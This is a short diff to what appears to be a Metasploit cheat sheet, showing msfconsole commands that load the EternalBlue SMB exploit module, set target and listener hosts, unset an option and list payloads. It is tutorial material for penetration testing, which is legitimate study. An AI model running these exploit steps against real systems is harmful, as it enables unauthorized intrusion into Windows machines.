@@ -35,9 +35,12 @@ msf6 > use exploit/windows/smb/smb_17_010_eternalblue
 # Show options
 msf6 exploit(windows/smb/smb_17_010_eternalblue) > options
 
-# Set option (ex. RHOSTS)
+# Set options
 msf6 exploit(windows/smb/smb_17_010_eternalblue) > set rhosts 10.0.0.1
 msf6 exploit(windows/smb/smb_17_010_eternalblue) > set lhost 10.0.0.2
+
+# Unset options
+msf6 exploit(windows/smb/smb_17_010_eternalblue) > unset rhosts
 
 # Show payloads
 msf6 exploit(windows/smb/smb_17_010_eternalblue) > show payloads
